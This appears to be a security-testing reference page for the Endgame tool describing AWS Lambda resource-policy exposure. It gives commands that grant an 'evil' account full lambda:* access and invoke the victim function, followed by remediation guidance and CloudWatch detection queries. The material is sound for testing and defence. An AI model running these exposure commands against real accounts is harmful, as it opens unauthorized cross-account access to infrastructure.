# Lambda Function Cross-Account Access

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

AWS Lambda Permission Policies (aka resource-based policies) can allow functions to be invoked from AWS accounts other than the one it is running in.

Compromised Lambda functions are a known attack path for [Privilege Escalation](https://resources.infosecinstitute.com/topic/cloudgoat-walkthrough-lambda-privilege-escalation/) and other nefarious use cases. While the impact often depends on the context of the Lambdas itself, Lambda functions often modify AWS infrastructure or have data plane access. Abusing these capabilities could compromise the confidentiality and integrity of the resources in the account.

Existing Exploitation tools such as [Pacu](https://github.com/RhinoSecurityLabs/pacu) have capabilities that help attackers exploit compromised Lambda functions. Pacu, for example, has modules that leverage Lambda functions to [backdoor new IAM roles](https://github.com/RhinoSecurityLabs/pacu/tree/master/modules/lambda__backdoor_new_roles), to [modify security groups](https://github.com/RhinoSecurityLabs/pacu/tree/master/modules/lambda__backdoor_new_sec_groups), and to [create new IAM users](https://github.com/RhinoSecurityLabs/pacu/tree/master/modules/lambda__backdoor_new_users). As such, Lambda functions are high-value targets to attackers, and existing exploitation frameworks such as Pacu and others increase the likelihood for abuse when a Lambda function is compromised.

## Steps to Reproduce

* **Option 1**: To expose the Lambda function using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service lambda --name test-resource-exposure
```

* **Option 2**: To expose the Lambda Function using AWS CLI, run the following from the victim account:

```bash
export EVIL_PRINCIPAL_ACCOUNT=999988887777

aws lambda add-permission \
    --function-name test-resource-exposure \
    --action lambda:* \
    --statement-id Endgame \
    --principal $EVIL_PRINCIPAL_ACCOUNT
```

* To view the contents of the exposed resource policy, run the following:

```bash
aws lambda get-policy --function-name test-resource-exposure
```

* Observe that the contents of the exposed resource policy match the example shown below.

## Example

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Endgame",
      "Effect": "Allow",
      "Principal": {
        "AWS": "999988887777"
      },
      "Action": [
        "lambda:*"
      ],
      "Resource": "arn:aws:lambda:us-east-1:111122223333:test-resource-exposure"
    }
  ]
}
```

## Exploitation

* Authenticate to the `evil` account (In this example, `arn:aws:iam::999988887777:user/evil`)

* Run the following command to invoke the function in the victim account:

```bash
export VICTIM_LAMBDA=arn:aws:lambda:us-east-1:111122223333:test-resource-exposure
aws lambda invoke --function-name $VICTIM_LAMBDA
```

* Observe that the output resembles the following:

```json
{
    "ExecutedVersion": "$LATEST",
    "StatusCode": 200
}
```

## Remediation

* **Trusted Accounts Only**: Ensure that cross-account Lambda functions allow access only to trusted accounts to prevent unknown function invocation requests
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **AWS Access Analyzer**: Leverage AWS Access Analyzer to report on external access to Lambda Functions. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda) for more details.
* **Restrict access to IAM permissions that could lead to exposure of your Lambda Functions**: Tightly control access to the following IAM actions:
      - [lambda:AddPermission](https://docs.aws.amazon.com/lambda/latest/dg/API_AddPermission.html): _Grants permission to give an AWS service or another account permission to use an AWS Lambda function_
      - [lambda:GetPolicy](https://docs.aws.amazon.com/lambda/latest/dg/API_GetPolicy.html): _Grants permission to view the resource-based policy for an AWS Lambda function, version, or alias_
      - [lambda:InvokeFunction](https://docs.aws.amazon.com/lambda/latest/dg/API_Invoke.html): _Grants permission to invoke an AWS Lambda function_
      - [lambda:ListFunctions](https://docs.aws.amazon.com/lambda/latest/dg/API_ListFunctions.html): _Grants permission to retrieve a list of AWS Lambda functions, with the version-specific configuration of each function_
      - [lambda:RemovePermission](https://docs.aws.amazon.com/lambda/latest/dg/API_RemovePermission.html): _Grants permission to revoke function-use permission from an AWS service or another account_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='lambda.amazonaws.com' and eventName like 'AddPermission'
```

The following query detects policy modifications which include the default IOC string:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='lambda.amazonaws.com' and (eventName like 'AddPermission' and requestParameters.statementId='Endgame')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [aws lambda add-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/add-permission.html)
* [Access Analyzer support for AWS Lambda Functions](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda)
